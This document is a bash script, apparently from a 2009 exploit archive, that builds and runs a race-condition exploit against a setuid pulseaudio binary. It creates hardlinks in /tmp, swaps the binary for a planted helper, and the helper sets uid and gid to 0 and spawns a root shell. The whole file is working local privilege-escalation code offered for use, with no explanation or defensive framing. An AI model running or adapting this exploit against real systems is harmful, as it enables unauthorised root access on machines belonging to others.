#!/bin/bash

pulseaudio=`which pulseaudio`
workdir="/tmp"
#workdir=$HOME
id=`which id`
shell=`which sh`

trap cleanup INT

function cleanup()
{
	rm -f $workdir/sh $workdir/sh.c $workdir/pa_race $workdir/pa_race.c 
	rm -rf $workdir/PATMP*
}

cat > $workdir/pa_race.c << __EOF__
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PULSEAUDIO_PATH		"$pulseaudio"
#define SH_PATH			"$workdir/sh"
#define TMPDIR_TEMPLATE		"$workdir/PATMPXXXXXX"

void _pause(long sec, long usec);

int main(int argc, char *argv[], char *envp[])
{
	int   status;
	pid_t pid;
	char  template[sizeof(TMPDIR_TEMPLATE)];
	char *tmpdir;
	char  hardlink[sizeof(template) + 2];
	char  hardlink2[sizeof(template) + 12];
	
	srand(time(NULL));
	
	for( ; ; )
	{
		snprintf(template, sizeof(template), "%s", TMPDIR_TEMPLATE);
		template[sizeof(template) - 1] = '\0';
		
		tmpdir = mkdtemp(template);
		if(tmpdir == NULL)
		{
			perror("mkdtemp");
			return 1;
		}
	
		snprintf(hardlink, sizeof(hardlink), "%s/A", tmpdir);
		hardlink[sizeof(hardlink) - 1] = '\0';
	
		snprintf(hardlink2, sizeof(hardlink2), "%s/A (deleted)", tmpdir);
		hardlink2[sizeof(hardlink2) - 1] = '\0';
	
		/* this fails if $workdir is a different partition */
		if(link(PULSEAUDIO_PATH, hardlink) == -1)
		{
			perror("link");
			return 1;
		}
		
		if(link(SH_PATH, hardlink2) == -1)
		{
			perror("link");
			return 1;
		}
		
		pid = fork();
		
		if(pid == 0)
		{
			char *argv[] = {hardlink, NULL};
			char *envp[] = {NULL};

			execve(hardlink, argv, envp);
			
			perror("execve");
			return 1;
		}
		
		if(pid == -1)
		{
			perror("fork");
			return 1;
		}
		else
		{
			/* tweak this if exploit does not work */
			_pause(0, rand() % 500);
			
			if(unlink(hardlink) == -1)
			{
				perror("unlink");
				return 1;
			}
	
			if(link(SH_PATH, hardlink) == -1)
			{
				perror("link");
				return 1;
			}
			waitpid(pid, &status, 0);
		}
		
		if(unlink(hardlink) == -1)
		{
			perror("unlink");
			return 1;
		}
		
		if(unlink(hardlink2) == -1)
		{
			perror("unlink");
			return 1;
		}
		
		if(rmdir(tmpdir) == -1)
		{
			perror("rmdir");
			return 1;
		}
	}
		
	return 0;
}

void _pause(long sec, long usec)
{
	struct timeval timeout;
	
	timeout.tv_sec  = sec;
	timeout.tv_usec = usec;
	
	if(select(0, NULL, NULL, NULL, &timeout) == -1)
	{
		perror("select");
	}
}
__EOF__

cat > $workdir/sh.c << __EOF__
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>


int main(int argc, char *argv[], char *envp[])
{
	if(geteuid() != 0)
	{
		return 1;
	}

	setuid(0);
	setgid(0);

	if(fork() == 0)
	{
		argv[0] = "$id";
		argv[1] = NULL;
		execve(argv[0], argv, envp);
		return 1;
	}

	argv[0] = "$shell";
	argv[1] = NULL;
	execve(argv[0], argv, envp);
	return 1;
}
__EOF__

gcc -o $workdir/pa_race $workdir/pa_race.c
gcc -o $workdir/sh $workdir/sh.c

$workdir/pa_race

# milw0rm.com [2009-07-20]
